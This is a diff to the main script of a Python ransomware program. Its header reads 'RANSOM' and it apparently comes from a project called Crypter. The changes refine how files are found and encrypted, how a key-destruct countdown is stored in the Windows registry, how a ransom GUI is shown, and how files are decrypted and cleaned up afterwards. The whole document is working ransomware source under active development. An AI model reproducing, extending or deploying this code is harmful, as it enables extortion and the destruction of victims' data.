@@ -1,11 +1,17 @@
 ## RANSOM
 ## Main Script
 ## author mls
-# !!! TODO FIRST: CORRECT TYPE IN BLINKING MESSAGE. PROOF READ EVERYTHING
-# TODO Increase window size or decrease padlock image size
-# Remote close X button
-# Add option to decrypt using the actual form!
-# Store and read start time from window registry
+# todo Adjust dialogs to only allow one instance open at a time
+# todo delete registry key following successful decryption
+
+'''
+@done:
+- Adjusted decrypt files button to disable once the key has been destoryed
+- Adjusted view encrypted files button to load a default messages if the list file was not found
+- Successful decryption now also disables the OK button, prevent a re-decryption
+    + It also disables the "Enter Decryption Key" button on the Main Menu
+- Implemented method to delete the timer registry key foillowing successful decrpytin
+'''
 
 # Import libs
 import os
@@ -45,11 +51,9 @@ class Main(Base.Base):
     else:
       self.Crypt = Crypt.SymmetricCrypto()
 
-    # Fetch files
-    file_list = self.find_files()
-
     # handle action
     if action == "encrypt" and not os.path.isfile(self.encrypted_file_list):
+      file_list = self.find_files()
       # Start encryption
       self.encrypt_files(file_list)
       # Present GUI
@@ -69,6 +73,7 @@ class Main(Base.Base):
     try:
       reg = _winreg.OpenKeyEx(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
       start_time = _winreg.QueryValueEx(reg, "")[0]
+      _winreg.CloseKey(reg)
     # If failure, create the key
     except WindowsError:
       start_time = int(time.time())
@@ -77,6 +82,20 @@ class Main(Base.Base):
       _winreg.CloseKey(reg)
         
     return start_time    
+
+  def cleanup(self):
+    # To be called once decryption has finished. Cleans up the system
+    
+    self.delete_encrypted_file_list()
+    self.delete_registry_entries()
+
+  def delete_registry_entries(self):
+    # Function to delete the timer registry keyo
+    
+    # Open and delete the key
+    reg = _winreg.OpenKeyEx(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
+    _winreg.DeleteKeyEx(reg, "")
+    _winreg.CloseKey(reg)
     
       
   def start_gui(self):
@@ -86,7 +105,7 @@ class Main(Base.Base):
     start_time = self.get_start_time()
     
     app = wx.App()
-    #sys._MEIPASS = "..\\..\\build_script\\images"
+    sys._MEIPASS = "..\\..\\build_script\\images"
     crypter_gui = Gui.MyFrame1(None, 
                                sys._MEIPASS, 
                                self.KEY_DESTRUCT_TIME_SECONDS, 
@@ -96,11 +115,9 @@ class Main(Base.Base):
                                
     crypter_gui.Show()
     app.MainLoop()
-      
-
-  def decrypt_files(self):
-    # Function to decrypt the provided files
-    # TODO Once decrypted, delete the registry key entry
+    
+  def get_encrypted_file_list(self):
+    # Function to return the list of encrypted files
 
     # Get list of encrypted files
     try:
@@ -109,16 +126,28 @@ class Main(Base.Base):
       fh.close()
     except IOError:
       raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)
+  
+    return file_list
+
+      
+
+  def decrypt_file(self, encrypted_file):
+    # Function to decrypt a file
+    # To be called and iterated via GUI
+    # TODO Once decrypted, delete the registry key entry
 
     # Decrypt!
-    for encrypted_file in file_list:
-      if not encrypted_file:
-        continue
+    if not encrypted_file:
+      return
 
-      # IF successful decryption, delete locked file
-      locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip())
-      if locked_path:
-        os.remove(locked_path)
+    # IF successful decryption, delete locked file
+    locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip())
+    if locked_path:
+      os.remove(locked_path)
+      
+      
+  def delete_encrypted_file_list(self):
+    # Function to delete the list of encrypted files
 
     # Remove encrypted file list
     os.remove(self.encrypted_file_list)
